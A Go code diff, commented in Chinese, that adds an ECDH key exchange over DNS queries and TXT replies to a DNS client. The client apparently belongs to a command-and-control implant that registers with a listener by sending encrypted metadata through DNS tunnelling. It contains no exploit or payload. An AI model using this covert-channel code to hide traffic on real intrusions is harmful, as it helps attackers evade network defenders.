@@ -119,6 +119,11 @@ func (c *DNSClient) Connect(host string) error {
 		c.domain += "."
 	}
 
+	// 会话前 ECDH 交换：必须在生成 MetaInfo **之前**。
+	// 公钥走一个子域标签（b32 后 52 字符，未超 63），服务端公钥从 TXT 回。
+	// 失败则 s 不受影响，MetaInfo 仍用静态密钥生成（老行为）。
+	c.kxHandshake()
+
 	// MetaInfo：仅 mi 注册分块用（DNS 查询标识用短 uid，避免超 253 字符限制）
 	if len(utils.MetaInfo) == 0 {
 		metaRaw, metaErr := utils.EncryptedMetaInfo()
@@ -166,6 +171,47 @@ func (c *DNSClient) Connect(host string) error {
 		debuglog.Printf("✅ [DNS] FirstBlood 成功\n")
 	}
 	return nil
+}
+
+// kxQueryName 会话前密钥交换查询名：<b32pub>.1_1.kx.<uid>.<domain>
+//
+// 与 mi 同形（chunk.idx_total.<type>.<uid>），所以服务端在这一步就能拿到 uid，
+// 可以按 uid 绑定派生结果，后续 mi 分块直接取用。
+func (c *DNSClient) kxQueryName(pubB32 string) string {
+	return fmt.Sprintf("%s.1_1.%s.%s.%s", pubB32, dnsLabel("kx"), c.clientID, c.domain)
+}
+
+// kxHandshake 会话前密钥交换：发 kx 查询，从 TXT 响应取服务端公钥并派生。
+//
+// 失败一律静默返回：客户端拿不到公钥就继续用静态密钥，
+// 与"服务端不支持 ECDH"表现一致，不会让整条传输起不来。
+func (c *DNSClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	pubB32 := b32Encode(kx.PublicKey())
+	if len(pubB32) > 63 {
+		return // 标签超限：放弃交换，走静态密钥
+	}
+	resp, err := c.dnsQuery(c.kxQueryName(pubB32))
+	if err != nil || resp == "" {
+		return
+	}
+	peerPub, err := b32Decode(strings.TrimSpace(resp))
+	if err != nil || len(peerPub) != encrypt.ECDHPublicKeySize {
+		return
+	}
+	salt, _ := app.GetListenerKeyConfig("dns")
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
+	debuglog.Printf("🔑 [DNS-KX] 会话前密钥交换完成，已替换静态主密钥\n")
 }
 
 // sendMetaInfo 将加密 MetaInfo 分块上行（mi 查询），供服务端注册客户端。
